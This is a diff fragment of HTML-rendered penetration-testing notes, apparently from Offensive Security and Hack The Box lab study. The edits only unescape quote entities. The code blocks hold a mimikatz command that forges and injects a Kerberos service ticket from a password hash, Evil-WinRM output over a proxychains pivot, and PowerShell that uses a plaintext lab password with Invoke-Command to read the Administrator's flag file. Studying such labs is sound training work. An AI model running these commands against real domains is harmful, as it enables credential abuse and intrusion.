+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9"></a>.\mimikatz.exe "kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-123456789-234567890-345678901 /target:http/files04.corp.com /service:iis_service /rc4:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
 </span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10"></a>
 </span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11"></a># Another example from offsec labs
-</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12"></a>.\mimikatz.exe &quot;kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:HTTP/web04.corp.com /service:iis_service /rc4:4d28cf5252d39971419580a51484ca09 /ptt&quot; &quot;exit&quot;
+</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12"></a>.\mimikatz.exe "kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:HTTP/web04.corp.com /service:iis_service /rc4:4d28cf5252d39971419580a51484ca09 /ptt" "exit"
 </span></code></pre></div></td></tr></table></div>
 <p>How to: </p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1"> 1</a></span>
@@ -28676,8 +28676,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3"></a><span class="go">|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK</span>
 </span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4"></a><span class="go">|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK</span>
 </span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5"></a><span class="go">*Evil-WinRM* PS C:\Users\backupadm\Documents&gt; get-domainuser -spn</span>
-</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6"></a><span class="go">Exception calling &quot;FindAll&quot; with &quot;0&quot; argument(s): &quot;An operations error occurred.</span>
-</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7"></a><span class="go">&quot;</span>
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6"></a><span class="go">Exception calling "FindAll" with "0" argument(s): "An operations error occurred.</span>
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7"></a><span class="go">"</span>
 </span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8"></a><span class="go">At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20</span>
 </span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9"></a><span class="go">+             else { $Results = $UserSearcher.FindAll() }</span>
 </span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10"></a><span class="go">+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
@@ -28704,18 +28704,18 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-43-13">13</a></span>
 <span class="normal"><a href="#__codelineno-43-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a><span class="c"># Set up: we are connected to the host machine from our attacker machine via Evil-WinRM</span>
 </span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2"></a><span class="c"># 1. We create a SecureString Object with our creds</span>
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;$password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">'$password'</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
 </span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4"></a><span class="c"># Example: </span>
-</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5"></a><span class="c"># $SecPassword = ConvertTo-SecureString &#39;!qazXSW@&#39; -AsPlainText -Force</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5"></a><span class="c"># $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force</span>
 </span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6"></a>
-</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;$domain\$userSamAccountName&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">'$domain\$userSamAccountName'</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
 </span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8"></a><span class="c"># Example:</span>
-</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9"></a><span class="c"># $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\backupadm&#39;, $SecPassword)</span>
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9"></a><span class="c"># $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)</span>
 </span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10"></a>
 </span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11"></a><span class="c"># 2. We send the nested Invoke-Command</span>
-</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="s2">&quot;$hostname.$domainName&quot;</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Content</span> <span class="s2">&quot;C:\Users\Administrator\Desktop\flag.txt&quot;</span> <span class="p">}</span>
+</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="s2">"$hostname.$domainName"</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Content</span> <span class="s2">"C:\Users\Administrator\Desktop\flag.txt"</span> <span class="p">}</span>
 </span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13"></a><span class="c"># Example: </span>
-</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14"></a><span class="c"># Invoke-Command -ComputerName &quot;MS01.INLANEFREIGHT.LOCAL&quot; -Credential $cred -ScriptBlock { Get-Content &quot;C:\Users\Administrator\Desktop\flag.txt&quot; }</span>
+</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14"></a><span class="c"># Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }</span>
 </span></code></pre></div></td></tr></table></div>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span>
 <span class="normal"><a href="#__codelineno-44-2">2</a></span>
@@ -28758,7 +28758,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5"></a>
 </span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6"></a><span class="c"># Once this is done, we need to restart the WinRM service. From the PS session:</span>
 </span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7"></a><span class="nb">Restart-Service</span> <span class="n">WinRM</span>
-</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8"></a><span class="c"># This will kick us out, so we&#39;ll start a new PSSession using the named registered session we set up previously.</span>
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8"></a><span class="c"># This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.</span>
 </span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9"></a>
 </span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10"></a><span class="c"># After we start the session, we can see that the double hop problem has been eliminated.</span>
 </span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nv">$hostName</span> <span class="n">-Credential</span> <span class="nv">$domain</span><span class="p">\</span><span class="nv">$userSamAccountName</span> <span class="n">-ConfigurationName</span>  <span class="nv">$sessionName</span>
